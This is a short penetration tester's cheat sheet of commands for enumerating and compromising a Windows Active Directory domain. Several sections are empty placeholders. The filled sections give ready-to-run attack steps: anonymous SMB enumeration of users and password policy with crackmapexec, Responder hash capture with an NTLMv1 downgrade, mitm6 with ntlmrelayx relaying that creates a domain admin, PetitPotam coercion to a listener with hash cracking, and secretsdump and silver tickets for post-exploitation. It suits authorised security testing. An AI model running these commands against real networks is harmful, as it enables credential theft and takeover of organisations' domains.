#This is a list of network based pentest commands to help enumerate and exploit a domain.
 # also visit https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg

#find hosts
	nmap -p135,445,22,80 -T2 -Pn -n --max-retries=1 --max-rtt-timeout=500ms -vvv -iL scope.txt -oA online-hosts

#Find DCs
	nslookup domain.com
	nslookup -type=srv _ldap._tcp.dc._msdcs.domain.com

#Using crackmap (6.0+) to enumerate online hosts
	crackmapexec smb scope.txt --log smb-online.txt

#Using crackmap to enum null/anon sessions
	crackmapexec smb dc-ip -u '' -p ''
		if works then:
			crackmapexec smb dc-ip -u '' -p '' --users
			crackmapexec smb dc-ip -u '' -p '' --pass-pol
	crackmapexec smb dc-ip -u 'a' -p ''
		if works then:
			crackmapexec smb dc-ip -u 'a' -p '' --users
			crackmapexec smb dc-ip -u 'a' -p '' --pass-pol
		also run:
			enum4linux dc-ip

#Listen for hashes
	responder -I eth0 -F
		you can change challenge in responder.conf to simple (1122334455667788) but it is more easily detectable due to numerous hosts having the same challenge (not normal).
		downgrade to NTLMv1 --lm

		OR

	mitm6 -d domain.com
	+
	ntlmrelayx -6 -t dc-ip -l loot -of hashes
		this has a lot of functionality, but default will attempt to create a domain admin.
		https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/




#Sprays


#Got creds?



#Explolits
	petitpotam
		https://github.com/topotam/PetitPotam?ref=blog.zsec.uk
	(start responder/ntlmrelayx) python3 petitpotam.py listen-ip target-ip
		take captured hash and run it through NTLMv1 Multitool to get hash to DES encryption (14000 in hashcat)
			https://github.com/evilmog/ntlmv1-multi?ref=blog.zsec.uk
		python3 ntlmv1.py --ntlmv1 <capture hash ^^>





#Post exploit / admin

	secretsdump

	silver tickets

	

















